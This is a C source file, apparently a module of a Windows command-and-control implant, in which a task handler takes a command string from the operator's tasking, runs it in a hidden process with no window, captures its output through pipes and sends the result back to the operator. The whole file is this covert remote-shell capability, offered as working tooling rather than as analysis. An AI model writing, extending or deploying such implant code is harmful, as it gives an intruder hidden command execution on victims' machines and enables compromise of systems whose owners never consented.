#include <communication.h>
#include <tlv.h>
#include <stdio.h>
#include <types.h>
#include <commands.h>

#define COMMAND_COUNT 1

Command commands[COMMAND_COUNT] = {
  {.id = 7, .function = shell_cmd }
};

void shell_cmd(int taskId, int argc, struct TLVBuild * tlv) {
  if (argc < 1) return;
  struct TLVBuild out;
  out.buf = malloc(50);
  out.read_cursor = 0;
  out.allocsize = 50;
  out.bufsize = 0;

  int cmdSize = extractInt32(tlv);
  char * cmd = malloc(cmdSize + 1);
  extractBytes(tlv, cmdSize, cmd);
  cmd[cmdSize] = 0x00;
  printf("[cmd] executing: %s\n", cmd);

  HANDLE hStdInPipeRead = NULL;
  HANDLE hStdInPipeWrite = NULL;
  HANDLE hStdOutPipeRead = NULL;
  HANDLE hStdOutPipeWrite = NULL;

  PROCESS_INFORMATION ProcessInfo = { };
  SECURITY_ATTRIBUTES SecurityAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
  STARTUPINFOA StartUpInfoA = { };

  if (!CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &SecurityAttr, 0))
    return;

  if (!CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &SecurityAttr, 0))
    return;

  StartUpInfoA.cb = sizeof(STARTUPINFOA);
  StartUpInfoA.dwFlags = STARTF_USESTDHANDLES;
  StartUpInfoA.hStdError = hStdOutPipeWrite;
  StartUpInfoA.hStdOutput = hStdOutPipeWrite;
  StartUpInfoA.hStdInput = hStdInPipeRead;

  if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &StartUpInfoA, &ProcessInfo))
  { send_output(taskId, "output", "Failed to create process", 0, NULL);
    return; }
  
  CloseHandle(hStdOutPipeWrite);
  CloseHandle(hStdInPipeRead);

  LPVOID pOutputBuffer = NULL;
  UCHAR buf[1025] = { 0 };
  DWORD dwBufferSize = 0;
  DWORD dwRead = 0;
  BOOL SuccessFul = FALSE;

  pOutputBuffer = LocalAlloc(LPTR, sizeof(LPVOID));

  do
  {
    SuccessFul = ReadFile(hStdOutPipeRead, buf, 1024, &dwRead, NULL);

    if (dwRead == 0) break;

    pOutputBuffer = LocalReAlloc(
      pOutputBuffer,
      dwBufferSize + dwRead,
      LMEM_MOVEABLE | LMEM_ZEROINIT
    );

    dwBufferSize += dwRead;

    memcpy(pOutputBuffer + (dwBufferSize - dwRead), buf, dwRead);
    memset(buf, 0, dwRead);
  } while (SuccessFul == TRUE);

  addBytes(&out, false, dwBufferSize, pOutputBuffer);

  memset(pOutputBuffer, 0, dwBufferSize);
  LocalFree(pOutputBuffer);
  pOutputBuffer = NULL;

  send_output(taskId, "output", "", out.bufsize, out.buf);

  CloseHandle(hStdOutPipeRead);
  CloseHandle(hStdInPipeWrite);

  free(cmd);
  free(out.buf);
}

